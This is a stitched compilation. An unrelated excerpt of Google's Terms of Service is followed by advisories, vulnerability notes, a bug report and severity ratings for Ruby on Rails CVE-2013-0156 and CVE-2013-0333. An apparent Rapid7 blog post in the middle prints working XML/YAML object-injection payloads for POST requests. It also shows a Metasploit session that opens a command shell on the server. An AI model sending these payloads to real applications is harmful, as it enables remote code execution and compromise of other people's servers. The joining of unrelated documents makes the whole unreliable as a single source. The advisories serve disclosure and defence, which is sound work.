If you think someone is infringing your [intellectual property rights](terms?hl=en_US#footnote-intellectual-property-rights), you can [send us notice of the infringement](https://support.google.com/legal/answer/3110420?hl=en_US) and we’ll take appropriate action. For example, we suspend or close the Google Accounts of repeat [copyright](terms?hl=en_US#footnote-copyright) infringers as described in our [Copyright Help Center](https://support.google.com/legal/topic/4558877?hl=en_US).

## Google content

Some of our [services](terms?hl=en_US#footnote-services) include content that belongs to Google — for example, many of the visual illustrations you see in Google Maps. You may use Google’s content as allowed by these terms and any [service-specific additional terms](terms/service-specific?hl=en_US), but we retain any intellectual property rights that we have in our content. Don’t remove, obscure, or alter any of our branding, logos, or legal notices. If you want to use our branding or logos, please see the [Google Brand Permissions](https://www.google.com/permissions?hl=en_US) page.

## Other content

Finally, some of our [services](terms?hl=en_US#footnote-services) give you access to content that belongs to other people or [organizations](terms?hl=en_US#footnote-organization) — for example, a store owner’s description of their own business, or a newspaper article displayed in Google News. You may not use this content without that person or organization’s permission, or as otherwise allowed by law. The views expressed in other people or organizations’ content are theirs, and don’t necessarily reflect Google’s views.

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/10-software-in-google-services-lightmode.svg)
# Software in Google services

Some of our [services](terms?hl=en_US#footnote-services) include downloadable or preloaded software. We give you permission to use that software as part of the services.

The license we give you is:

* worldwide, which means it’s valid anywhere in the world
* non-exclusive, which means that we can license the software to others
* royalty-free, which means there are no monetary fees for this license
* personal, which means it doesn’t extend to anyone else
* non-assignable, which means you’re not allowed to assign the license to anyone else

Some of our services include software that’s offered under open source license terms that we make available to you. Sometimes there are provisions in the open source license that explicitly override parts of these terms, so please be sure to read those licenses.

You may not copy, modify, distribute, sell, or lease any part of our services or software.

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/11-in-case-of-problems-or-disagreements-lightmode.svg)
# In case of problems or disagreements

Both the law and these terms give you the right to (1) a certain quality of service, and (2) ways to fix problems if things go wrong. If you’re a [consumer](terms?hl=en_US#footnote-consumer), then you enjoy all legal rights granted to consumers under applicable law, as well as any additional rights provided under these terms or [service-specific additional terms](terms/service-specific?hl=en_US).

## Legal guarantee

If you’re an EEA-based [consumer](terms?hl=en_US#footnote-consumer), and you’ve agreed to our Terms of Service, then EEA consumer laws provide you with a [legal guarantee](terms?hl=en_US#footnote-legal-guarantee) covering the digital content, services, or goods that we provide you. Under this guarantee, we’re [liable](terms?hl=en_US#footnote-liability) for any [lack of conformity](terms?hl=en_US#footnote-lack-conformity) that you discover:

* within two years of the delivery of goods (such as a phone) or the one-time supply of digital content or services (such as purchasing a movie)
* at any time during the “continuous” supply of digital content or services (such as Maps or Gmail)

Your national laws may provide an even longer guarantee. Your rights under these legal guarantees aren’t limited by any other [commercial guarantees](terms?hl=en_US#footnote-commercial-guarantee) that we provide. If you want to make a guarantee claim, please [contact us](https://about.google/contact-google/?hl=en_US).

## Liabilities

### For all users

These terms don’t limit [liability](terms?hl=en_US#footnote-liability) for:

* fraud or fraudulent misrepresentation
* death or personal injury caused by negligence
* gross negligence
* willful misconduct

Other than the liabilities described above, Google is liable only for its breaches of these terms or applicable [service-specific additional terms](terms/service-specific?hl=en_US), subject to applicable law.

### For business users and organizations only

If you’re a [business user](terms?hl=en_US#footnote-business-user) or [organization](terms?hl=en_US#footnote-organization):

* To the extent allowed by applicable law, you’ll [indemnify](terms?hl=en_US#footnote-indemnify) Google and its directors, officers, employees, and contractors for any third-party legal proceedings (including actions by government authorities) arising out of or relating to your unlawful use of the [services](terms?hl=en_US#footnote-services) or violation of these terms or [service-specific additional terms](terms/service-specific?hl=en_US). This indemnity covers any liability or expense arising from claims, losses, damages, judgments, fines, litigation costs, and legal fees, except to the extent a liability or expense is caused by Google's breach, negligence, or willful misconduct.
* If you’re legally exempt from certain responsibilities, including [indemnification](terms?hl=en_US#footnote-indemnify), then those responsibilities don’t apply to you under these terms. For example, the United Nations enjoys certain immunities from legal obligations and these terms don’t override those immunities.
* Google won’t be responsible for the following [liabilities](terms?hl=en_US#footnote-liability):
  + loss of profits, revenues, business opportunities, goodwill, or anticipated savings
  + indirect or consequential loss
  + punitive damages
* Except as stated in the *[For all users](terms?hl=en_US#for-all)* section above, Google’s total liability arising out of or relating to these terms is limited to the greater of (1) €500 or (2) 125% of the fees that you paid to use the relevant services in the 12 months before the breach.

## Taking action in case of problems

Before taking action as described below, we’ll provide you with advance notice when reasonably possible, describe the reason for our action, and give you an opportunity to clarify the issue and address it, unless we reasonably believe that doing so would:

* cause harm or [liability](terms?hl=en_US#footnote-liability) to a user, third party, or Google
* violate the law or a legal enforcement authority’s order
* compromise an investigation
* compromise the operation, integrity, or security of our [services](terms?hl=en_US#footnote-services)

### Removing your content

If we reasonably believe that any of [your content](terms?hl=en_US#footnote-your-content) (1) breaches these terms, [service-specific additional terms or policies](terms/service-specific?hl=en_US), (2) violates applicable law, or (3) could harm our users, third parties, or Google, then we reserve the right to take down some or all of that content in accordance with applicable law. Examples include child pornography, content that facilitates human trafficking or harassment, terrorist content, and content that infringes someone else’s [intellectual property rights](terms?hl=en_US#footnote-intellectual-property-rights).

### Suspending or terminating your access to Google services

Without limiting any of our other rights, Google may suspend or terminate your access to the services or delete your Google Account if any of these things happen:

* you materially or repeatedly breach these terms, [service-specific additional terms or policies](terms/service-specific?hl=en_US)
* we’re required to do so to comply with a legal requirement or a court order
* we reasonably believe that your conduct causes harm or [liability](terms?hl=en_US#footnote-liability) to a user, third party, or Google — for example, by hacking, phishing, harassing, spamming, misleading others, or scraping content that doesn’t belong to you

For more information about why we disable accounts and what happens when we do, see this [Help Center page](https://support.google.com/accounts/answer/40695?hl=en_US). If you believe your Google Account has been suspended or terminated in error, [you can appeal](https://support.google.com/accounts/answer/40695?hl=en_US).

Of course, you’re always free to stop using our services at any time. If you’re an EEA-based [consumer](terms?hl=en_US#footnote-consumer), you can also [withdraw from these terms](terms?hl=en_US#toc-withdrawal-form) within 14 days of accepting them. If you do stop using a service, we’d [appreciate knowing why](https://www.google.com/tools/feedback/intl/en/?hl=en_US) so that we can continue improving our services.

## Handling requests for your data

Respect for the privacy and security of your data underpins our approach to responding to data disclosure requests. When we receive data disclosure requests, our team reviews them to make sure they satisfy legal requirements and Google’s [data disclosure policies](terms/information-requests?hl=en_US). Google Ireland Limited accesses and discloses data, including communications, in accordance with the laws of Ireland, and EU law applicable in Ireland. For more information about the data disclosure requests that Google receives worldwide, and how we respond to such requests, see our [Transparency Report](https://transparencyreport.google.com?hl=en_US) and [Privacy Policy](privacy?hl=en_US).

## Settling disputes, governing law, and courts

For information about how to contact Google, please visit our [contact page](https://www.google.com/contact?hl=en_US).

If you’re a resident of, or an [organization](terms?hl=en_US#footnote-organization) based in, the European Economic Area (EEA) or Switzerland, these terms and your relationship with Google under these terms and [service-specific additional terms](terms/service-specific?hl=en_US), are governed by the laws of your country of residence, and you can file legal disputes in your local courts. If you’re an EEA-based [consumer](terms?hl=en_US#footnote-consumer), please [contact us](https://google.com/contact?hl=en_US) to resolve issues directly. The European Commission also offers an [Online Dispute Resolution platform](https://ec.europa.eu/consumers/odr), but Google isn’t legally required to use this or other alternative dispute resolution platforms.

# About these terms

By law, you have certain rights that can’t be limited by a contract like these terms of service. These terms are in no way intended to restrict those rights.

These terms describe the relationship between you and Google. They don’t create any legal rights for other people or [organizations](terms?hl=en_US#footnote-organization), even if others benefit from that relationship under these terms.

We want to make these terms easy to understand, so we’ve used examples from our [services](terms?hl=en_US#footnote-services). But not all services mentioned may be available in your country.

If it turns out that a particular term is not valid or enforceable, this will not affect any other terms.

If you don’t follow these terms or the [service-specific additional terms](terms/service-specific?hl=en_US), and we don’t take action right away, that doesn’t mean we’re giving up any rights that we may have, such as taking action in the future.

We may update these terms and [service-specific additional terms](terms/service-specific?hl=en_US) (1) to reflect changes in our services or how we do business — for example, when we add new services, features, technologies, pricing, or benefits (or remove old ones), (2) for legal, regulatory, or security reasons, or (3) to prevent abuse or harm.

If we materially change these terms or [service-specific additional terms](terms/service-specific?hl=en_US), we’ll provide you with reasonable advance notice and the opportunity to review the changes, except (1) when we launch a new service or feature, or (2) in urgent situations, such as preventing ongoing abuse or responding to legal requirements. If you don’t agree to the new terms, you should remove [your content](terms?hl=en_US#footnote-your-content) and stop using the services. You can also end your relationship with us at any time by closing your Google Account.

# EEA instructions on withdrawal

### Right of withdrawal

You have the right to withdraw from this contract within 14 days without giving any reason.

The withdrawal period will expire after 14 days from the day of the conclusion of the contract.

To exercise the right of withdrawal, you must inform us of your decision to withdraw from this contract by an unequivocal statement (e.g. a letter sent by post or e-mail).

You may use the attached model withdrawal form, but it is not obligatory. You can also electronically fill in and submit the model withdrawal form or any other unequivocal statement on our website ([g.co/EEAWithdrawalForm](https://g.co/EEAWithdrawalForm)). If you use this option, we will communicate to you an acknowledgement of receipt of such a withdrawal on a durable medium (e.g. by e-mail) without delay.

To meet the withdrawal deadline, it is sufficient for you to send your communication concerning your exercise of the right of withdrawal before the withdrawal period has expired.

### Effects of withdrawal

If you withdraw from this contract, we shall reimburse to you all payments received from you, including the costs of delivery (with the exception of the supplementary costs resulting from your choice of a type of delivery other than the least expensive type of standard delivery offered by us), without undue delay and in any event not later than 14 days from the day on which we are informed about your decision to withdraw from this contract. We will carry out such reimbursement using the same means of payment as you used for the initial transaction, unless you have expressly agreed otherwise; in any event, you will not incur any fees as a result of such reimbursement.

### Model withdrawal form

(complete and return this form only if you wish to withdraw from the contract)

## Ruby on Rails Action Pack framework insecurely typecasts YAML and Symbol XML parameters

#### Vulnerability Note VU#380039

Original Release Date: 2013-01-08 | Last Revised: 2013-01-11

---

### Overview

The Ruby on Rails Action Pack framework is susceptible to authentication bypass, SQL injection, arbitrary code execution, or denial of service.

### Description

| The [Ruby on Rails advisory](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion) states:  *"Multiple vulnerabilities in parameter parsing in Action Pack**There are multiple weaknesses in the parameter parsing code for Ruby on Rails which allows attackers to bypass authentication systems, inject arbitrary SQL, inject and execute arbitrary code, or perform a DoS attack on a Rails application. This vulnerability has been assigned the CVE identifier CVE-2013-0156.**Versions Affected: ALL versions**Not affected: NONE**Fixed Versions: 3.2.11, 3.1.10, 3.0.19, 2.3.15**Impact**------**The parameter parsing code of Ruby on Rails allows applications to automatically cast values from strings to certain data types. Unfortunately the type casting code supported certain conversions which were not suitable for performing on user-provided data including creating Symbols and parsing YAML. These unsuitable conversions can be used by an attacker to compromise a Rails application.**Due to the critical nature of this vulnerability, and the fact that portions of it have been disclosed publicly, all users running an affected release should either upgrade or use one of the work arounds \*immediately\*.**Releases**--------**The 3.2.11, 3.1.10, 3.0.19 and 2.3.15 releases are available at the normal locations."*Additional details are available in the [full advisory](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion). Exploit code for this vulnerability is publicly available. |
| --- |

### Impact

| A Ruby on Rails application that uses Action Pack is susceptible to authentication bypass, SQL injection, arbitrary code execution or denial of service. |
| --- |

### Solution

| **Apply an Update**Versions 3.2.11, 3.1.10, 3.0.19, and 2.3.15 have been released to address this vulnerability. |
| --- |

| The [Ruby on Rails advisory](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion) states the following workarounds:*Workarounds**-----------**The work arounds differ depending on the Rails version you are using, and whether or not your application needs to support XML Parameters.**Disabling XML Entirely**----------------------**Users who don't need to support XML parameters should disable XML parsing entirely by placing one of the following snippets inside an application initializer.**Rails 3.2, 3.1 and 3.0**----------------------**ActionDispatch::ParamsParser::DEFAULT\_PARSERS.delete(Mime::XML)**Rails 2.3**---------**ActionController::Base.param\_parsers.delete(Mime::XML)**Removing YAML and Symbol support from the XML parser**----------------------------------------------------**If your application must continue to parse XML you must disable the YAML and Symbol type conversion from the Rails XML parser. You should place one of the following code snippets in an application initializer to ensure your application isn't vulnerable. You should also consider greatly reducing the value of REXML::Document.entity\_expansion\_limit to limit the risk of entity explosion attacks.**YAML Parameter Parsing**----------------------**Rails has also shipped with YAML parameter parsing code, this was only ever enabled by default in Rails 1.1.0, but users who do enable it are vulnerable to all the exploits mentioned above.. There is no fix for YAML object injection, so if you have enabled it you must disable it immediately.**For 2.x apps, check whether your app sets `ActionController::Base.param\_parsers[Mime::YAML] = :yaml` and snip that out if it does.**For 3.x apps do this to disable:* *ActionDispatch::ParamsParser::DEFAULT\_PARSERS.delete(Mime::YAML)**Rails 3.2, 3.1, 3.0**---------**ActiveSupport::XmlMini::PARSING.delete("symbol")**ActiveSupport::XmlMini::PARSING.delete("yaml")**Rails 2.3**---------**ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('symbol')**ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('yaml')* |

Security Advisory: Critical

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2013%3A0154)

## Topic

Updated rubygem-actionpack, rubygem-activesupport, and rubygem-activerecord
packages that fix multiple security issues are now available for Red Hat
Subscription Asset Manager.

The Red Hat Security Response Team has rated this update as having critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

Ruby on Rails is a model–view–controller (MVC) framework for web
application development. Action Pack implements the controller and the view
components. Active Record implements object-relational mapping for
accessing database entries using objects. Active Support provides support
and utility classes used by the Ruby on Rails framework.

Multiple flaws were found in the way Ruby on Rails performed XML parameter
parsing in HTTP requests. A remote attacker could use these flaws to
execute arbitrary code with the privileges of a Ruby on Rails application,
perform SQL injection attacks, or bypass the authentication using a
specially-created HTTP request. (CVE-2013-0156)

Red Hat is aware that a public exploit for the CVE-2013-0156 issues is
available that allows remote code execution in applications using Ruby on
Rails.

Multiple input validation vulnerabilities were discovered in
rubygem-activerecord. A remote attacker could possibly use these flaws to
perform an SQL injection attack against an application using
rubygem-activerecord. (CVE-2012-2661, CVE-2012-2695, CVE-2012-6496,
CVE-2013-0155)

Multiple input validation vulnerabilities were discovered in
rubygem-actionpack. A remote attacker could possibly use these flaws to
perform an SQL injection attack against an application using
rubygem-actionpack and rubygem-activerecord. (CVE-2012-2660, CVE-2012-2694)

Multiple cross-site scripting (XSS) flaws were found in rubygem-actionpack.
A remote attacker could use these flaws to conduct XSS attacks against
users of an application using rubygem-actionpack. (CVE-2012-3463,
CVE-2012-3464, CVE-2012-3465)

A flaw was found in the HTTP digest authentication implementation in
rubygem-actionpack. A remote attacker could use this flaw to cause a
denial of service of an application using rubygem-actionpack and digest
authentication. (CVE-2012-3424)

Users are advised to upgrade to these updated rubygem-actionpack,
rubygem-activesupport, and rubygem-activerecord packages, which resolve
these issues. Katello must be restarted ("service katello restart") for
this update to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at

# Serialization Mischief in Ruby Land (CVE-2013-0156)

* Jan 09, 2013
* 4 min read
* [HD Moore](/blog/author/hd-moore/)

*Last updated at Tue, 25 Apr 2023 23:18:45 GMT*

This afternoon a [particularly scary advisory](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion) was posted to the Ruby on Rails (RoR) security discussion list. The summary is that the XML processor in RoR can be tricked into decoding the request as a YAML document or as a Ruby Symbol, both of which can expose the application to remote code execution or SQL injection. A gentleman by the name of Felix Wilhelm [went into detail](http://www.insinuator.net/2013/01/rails-yaml/) on how the vulnerability works, but stopped short of providing a working proof of concept. These kinds of bugs are close to my heart, as Metasploit itself is written in Ruby, and we use Ruby on Rails within the Metasploit Community, Express, and Pro user interfaces.

We marshaled the troops and released a [security update](https://community.rapid7.com/docs/DOC-2143) for Metasploit users (**2013010202**), updated all of our own RoR applications with the [workaround](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion), and started digging into the vulnerability itself.

Ben M. Murphy, a researcher working on this issue, [claims](http://www.reddit.com/r/netsec/comments/167c11/serious_vulnerability_in_ruby_on_rails_allowing/) that this can lead to direct system command execution in all Ruby on Rails web applications. If this pans out, this would put [thousands of production web sites](http://arstechnica.com/security/2013/01/extremely-crtical-ruby-on-rails-bug-threatens-more-than-200000-sites/) at risk of remote compromise.  Mr Murphy has not released his exploit code for the issue, but Felix's blog post provided enough information to start poking at the vulnerability.

To demonstrate the issue, send the following data as the body of a POST request to any RoR web application, with the Content-Type header set to "application/xml":

```
<?xml version="1.0" encoding="UTF-8"?>
<bang type="yaml">--- !ruby/object:Time {}
</bang>

```

On the server side, this decodes to a live Time object:

```
Parameters: {"bang"=>1969-12-31 18:00:00 -0600}

```

The mechanics of this bug allow for at least three different paths for exploitation:

1. ~~Trigger a SQL injection flaw by sending a Symbol in place of a parameter used in a Model.find\_by\*() call. This technique was discovered by [joernchen](https://twitter.com/joernchen) and [documented here](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/DCNTNp_qjFM). This can be accomplished using both the YAML and Symbol types in the XML, but the Symbol format is easiest.~~ **The original description was wrong, but SQL injection is still possible using Arel objects. Take a look at [Postmodern's blog post](https://github.com/ronin-ruby/ronin-ruby.github.com/blob/rails-pocs/blog/_posts/2013-01-09-rails-pocs.md) for more information on the SQL injection vector.**

2. Allocate an arbitrary Ruby object and be able to set any instance variables. This object is sent instead of the expected parameter to the application. This can lead to all sorts of chaos, but doesn't provide remote code execution all by itself, since an object is required that does unsafe things with init\_with() or the application has to do something dangerous with the unexpected object parameter.

```
<?xml version="1.0" encoding="UTF-8"?>
<boom type="yaml"><![CDATA[--- !ruby/object:UnsafeObject
attribute1: value1
]]></boom>

```

This results in a sequence that looks something like the following:

```
obj = UnsafeObject.allocate
if obj.respond_to?(:init_with)
  obj.init_with(.. attributes ..)
else
  arguments.each_pair { |key,val| obj.instance_variable_set(key, val) }
end

```

3. Instantiate an arbitrary Ruby object and be able to call the "[]=" method with any desired parameters. This can be abused in a slightly different way and opens additional avenues for attack.

```
<?xml version="1.0" encoding="UTF-8"?>
<boom type="yaml"><![CDATA[--- !ruby/hash:UnsafeObject
attribute1: value1
]]></boom>

```

This results in a different code path being taken:

```
obj = UnsafeObject.new
arguments.each_pair { |key,val| obj[key] = val }

```

In the case of #1, the application must pass the Symbol parameter into a SQL query, which limits the attack surface to database-enabled applications. The interesting thing about methods #2 and #3 is that they will work regardless of whether the application does anything wtih SQL. The caveat is that the application needs to either do something unsafe with the unexpected object, or a class already in memory has to be abused through the init\_with() or []= method handlers.

A quick review of common Ruby on Rails classes didn't turn up any obvious paths to exploit #2 or #3, but given Mr. Murphy's claims and the sheer number of code paths available, this is more than likely the worst security issue that the Rails platform has seen to date.

Stay tuned for more information on this flaw and more than likely a Metasploit module or two in the coming days.

-HD

**Update 1:** We are still looking into how this can be turned into a remote exploit, but for any application that has done a ***require "drb"*** somewhere in the dependency list, the following local exploit scenario works.

First instantiate a DRb Server object in the Rails application using a request like the one below:

```
<?xml version="1.0" encoding="UTF-8"?>
<boom type="yaml"><![CDATA[--- !ruby/hash:DRb::DRbServer {}
]]></boom>

```

Now open msfconsole and use the drb\_remote\_codeexec module to get a session as the web user. This is limited to the local system, since DRb picks a random port bound to localhost when instantiated with no arguments.

```
$ msfconsole
msf> use exploit/linux/misc/drb_remote_codeexec
msf  exploit(drb_remote_codeexec) > set URI druby://localhost:45074
msf  exploit(drb_remote_codeexec) > exploit
[*] Started reverse double handler
[*] trying to exploit instance_eval
< snip >
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.0.4:4444 -> 192.168.0.4:53299) at 2013-01-09 13:06:39 -0600

id
uid=1001(www) gid=1001(www) groups=1001(www)

```

**Update 2:** An anonymous contributor pointed us to a specific class that is exploitable using the ruby/hash method (#3 above). The class is

ActionDispatch::Routing::RouteSet::NamedRouteCollection. Expect a Metasploit module in the next 4-12 hours.

**Update 3:** The Metasploit module is [now available on GitHub](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_xml_yaml_code_exec.rb) and handles Ruby on Rails versions 2 and 3.

**Update 4:** [A walkthrough of using the scanner and exploit modules](https://blog.rapid7.com/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156) is now available

**Update 5:** [CVE-2013-0333](https://blog.rapid7.com/2013/01/29/exploit-for-ruby-on-rails-cve-2013-0333). Second verse, same as the first, except this time. Metapsloit itself is not vulnerable.

There are multiple weaknesses in the parameter parsing code for Ruby on Rails which allows attackers to bypass authentication systems, inject arbitrary SQL, inject and execute arbitrary code, or perform a DoS attack on a Rails application. This vulnerability has been assigned the CVE identifier CVE-2013-0156.

Versions Affected: ALL versions

Not affected: NONE

Fixed Versions: 3.2.11, 3.1.10, 3.0.19, 2.3.15

Impact

------

The parameter parsing code of Ruby on Rails allows applications to automatically cast values from strings to certain data types. Unfortunately the type casting code supported certain conversions which were not suitable for performing on user-provided data including creating Symbols and parsing YAML. These unsuitable conversions can be used by an attacker to compromise a Rails application.

Due to the critical nature of this vulnerability, and the fact that portions of it have been disclosed publicly, all users running an affected release should either upgrade or use one of the work arounds \*immediately\*.

Releases

--------

The 3.2.11, 3.1.10, 3.0.19 and 2.3.15 releases are available at the normal locations.

Workarounds

-----------

The work arounds differ depending on the Rails version you are using, and whether or not your application needs to support XML Parameters.

Disabling XML Entirely

----------------------

Users who don't need to support XML parameters should disable XML parsing entirely by placing one of the following snippets inside an application initializer.

Rails 3.2, 3.1 and 3.0

----------------------

ActionDispatch::ParamsParser::DEFAULT\_PARSERS.delete(Mime::XML)

Rails 2.3

---------

ActionController::Base.param\_parsers.delete(Mime::XML)

Removing YAML and Symbol support from the XML parser

----------------------------------------------------

If your application must continue to parse XML you must disable the YAML and Symbol type conversion from the Rails XML parser. You should place one of the following code snippets in an application initializer to ensure your application isn't vulnerable. You should also consider greatly reducing the value of REXML::Document.entity\_expansion\_limit to limit the risk of entity explosion attacks.

YAML Parameter Parsing

----------------------

Rails has also shipped with YAML parameter parsing code, this was only ever enabled by default in Rails 1.1.0, but users who do enable it are vulnerable to all the exploits mentioned above.. There is no fix for YAML object injection, so if you have enabled it you must disable it immediately.

For 2.x apps, check whether your app sets `ActionController::Base.param\_parsers[Mime::YAML] = :yaml` and snip that out if it does.

For 3.x apps do this to disable:

 ActionDispatch::ParamsParser::DEFAULT\_PARSERS.delete(Mime::YAML)

Rails 3.2, 3.1, 3.0

---------

ActiveSupport::XmlMini::PARSING.delete("symbol")

ActiveSupport::XmlMini::PARSING.delete("yaml")

Rails 2.3

---------

ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('symbol')

ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('yaml')

Patches

-------

To aid users who aren't able to upgrade immediately we have provided patches for the two supported release series. They are in git-am format and consist of a single changeset.

\* 2-3-xml\_parsing.patch - Patch for 2.3 series

\* 3-0-xml\_parsing.patch - Patch for 3.0 series

\* 3-1-xml\_parsing.patch - Patch for 3.1 series

\* 3-2-xml\_parsing.patch - Patch for 3.2 series

Please note that only the 3.1.x and 3.2.x series are supported at present. Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases.

Credits

-------

This vulnerability was reported to us by numerous people, many thanks to Ben Murphy, Magnus Holm, Felix Wilhelm, Darcy Laycock, Jonathan Rudenberg, Bryan Helmkamp, Benoist Claassen and Charlie Somerville for reporting the issue to us and working with us to ensure the fixes worked.

| [Description](show_bug.cgi?id=892870#c0)  Kurt Seifried    2013-01-08 05:57:29 UTC  ```  The Ruby on Rails project reports:  Multiple vulnerabilities in parameter parsing in ActionPack  There are multiple weaknesses in the parameter parsing code for Ruby on Rails  which could allow attackers to bypass authentication systems, inject arbitrary SQL, inject an execute arbitrary code, or perform a DoS attack on a rails  application. This vulnerability has been assigned the CVE identifier  [CVE-2013-0156](https://access.redhat.com/security/cve/CVE-2013-0156).  Versions Affected:  ALL versions Not affected:       NONE Fixed Versions:     3.2.11, 3.1.10, 3.0.19, 2.3.15  Impact ------ The XML parameter parsing code of Ruby on Rails allows applications to  automatically to cast values from strings to certain data types.   Unfortunately the type casting code supported certain conversions which were  not suitable for performing on user-provided data including.  This unsuitable  conversion can be used by an attacker to compromise a rails application.  Due to the serious nature of this vulnerability, and the fact it has been  disclosed publicly, all users running an affected release should either  upgrade or use one of the work arounds *immediately*.  Releases -------- The FIXED releases are available at the normal locations.  Workarounds ----------- The work arounds differ depending on the rails version you are using.  It  involves disabling the YAML and Symbol type conversion from the Rails XML  parser.  You should place one of the following code snippets in an  application initializer to ensure your application isn't vulnerable.  Rails 3.2, 3.1, 3.0 ---------  ActiveSupport::XmlMini::PARSING.delete("symbol") ActiveSupport::XmlMini::PARSING.delete("yaml")  Rails 2.3 ---------  ActiveSupport::CoreExtensions::Hash::Conversions::XML_PARSING.delete('symbol') ActiveSupport::CoreExtensions::Hash::Conversions::XML_PARSING.delete('yaml')   ```  [Comment

## Synopsis

Critical: Ruby on Rails security update

## Type/Severity

Security Advisory: Critical

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2013%3A0153)

## Topic

Updated rubygem-actionpack, rubygem-activesupport,
ruby193-rubygem-actionpack, and ruby193-rubygem-activesupport packages that
fix multiple security issues are now available for Red Hat OpenShift
Enterprise 1.0.

The Red Hat Security Response Team has rated this update as having critical
security impact. A Common Vulnerability Scoring System (CVSS) base score,
which gives a detailed severity rating, is available from the CVE link in
the References section.

## Description

Ruby on Rails is a model–view–controller (MVC) framework for web
application development. Action Pack implements the controller and the view
components. Active Support provides support and utility classes used by the
Ruby on Rails framework.

Multiple flaws were found in the way Ruby on Rails performed XML parameter
parsing in HTTP requests. A remote attacker could use these flaws to
execute arbitrary code with the privileges of a Ruby on Rails application,
perform SQL injection attacks, or bypass the authentication using a
specially-created HTTP request. (CVE-2013-0156)

Red Hat is aware that a public exploit for the CVE-2013-0156 issues is
available that allows remote code execution in applications using Ruby on
Rails.

All users of Red Hat OpenShift Enterprise are advised to upgrade to these
updated packages, which correct these issues. For Red Hat OpenShift
Enterprise administrators, the openshift-broker and openshift-console
services must be restarted for this update to take effect. Users of
OpenShift are advised to update their own applications that are running
Ruby on Rails.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/knowledge/articles/11258>

## Ruby on Rails 3.0 and 2.3 JSON Parser vulnerability

#### Vulnerability Note VU#628463

Original Release Date: 2013-01-28 | Last Revised: 2013-03-11

---

### Overview

The Ruby on Rails 3.0 and 2.3 JSON parser contain a vulnerability that may result in arbitrary code execution.

### Description

| The [Ruby on Rails advisory](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/1h2DR63ViGo) states:  *There is a vulnerability in the JSON code for Ruby on Rails which allows attackers to bypass authentication systems, inject arbitrary SQL, inject and execute arbitrary code, or perform a DoS attack on a Rails application. This vulnerability has been assigned the CVE identifier CVE-2013-0333.**Versions Affected: 2.3.x, 3.0.x**Not Affected: 3.1.x, 3.2.x, applications using the yajl gem.**Fixed Versions: 3.0.20, 2.3.16**Impact**- ------**The JSON Parsing code in Rails 2.3 and 3.0 support multiple parsing backends. One of the backends involves transforming the JSON into YAML, and passing that through the YAML parser. Using a specially crafted payload attackers can trick the backend into decoding a subset of YAML.**All users running an affected application should upgrade or use the workaround immediately.**Note: This is a separate vulnerability to CVE-2013-0156, if you are running a 2.3 or 3.0 application you must still take action to protect your application.* Additional details may be found in the [full Ruby on Rails advisory](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/1h2DR63ViGo). |
| --- |

### Impact

| An unauthenticated attacker using a specifically crafted payload may be able to trick the Ruby on Rails backend into executing arbitrary code. |
| --- |

### Solution

| **Apply an Update**Ruby on Rails 3.0.20 and 2.3.16 were released to address this vulnerability. |
| --- |

| The [Ruby on Rails advisory](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/1h2DR63ViGo) states the following workarounds as well.*If you are unable to upgrade, or apply the patches, you can work around this vulnerability by switching backends to the JSONGem backend. Place this code in an application initializer:*  *ActiveSupport::JSON.backend = "JSONGem"**If you are running Ruby 1.8 you will need to ensure that the `json` or `json\_pure` gems are installed and in your application's Gemfile. Ruby 1.9 includes this code already.* |

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
